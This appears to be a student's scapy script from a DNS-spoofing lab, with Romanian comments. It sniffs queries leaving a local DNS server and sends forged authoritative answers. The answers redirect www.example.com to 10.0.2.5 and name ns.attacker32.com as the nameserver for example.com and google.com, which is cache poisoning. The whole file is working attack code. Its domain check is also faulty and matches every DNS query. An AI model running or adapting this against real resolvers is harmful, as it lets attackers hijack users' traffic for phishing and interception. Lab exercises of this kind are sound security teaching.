#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
  #verificăm dacă un pachet de rețea (pkt) utilizează protocolul DNS și
  #dacă numele de domeniu interogat (QNAME) în cadrul pachetului este "www.example.com".
  if (DNS in pkt and 'www.example.com' or 'www.google.com' in pkt[DNS].qd.qname.decode('utf-8')):
    pkt.show()
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')
    # Adaugarea campului de authority pentru example.com 
    NSsec1 = DNSRR(rrname='example.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    # adaugam un nou domeniu pe care sa il fasificam de exemplu google.com
    NSsec2 = DNSRR(rrname='google.com', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=0,
                 an=Anssec, ns=NSsec2/NSsec1)
    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    spoofpkt.show()
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns() - atacam serverul local de dns
f = 'udp and src host 10.9.0.53  and dst port 53'
pkt = sniff(iface='br-8eb738e511da', filter=f, prn=spoof_dns)      
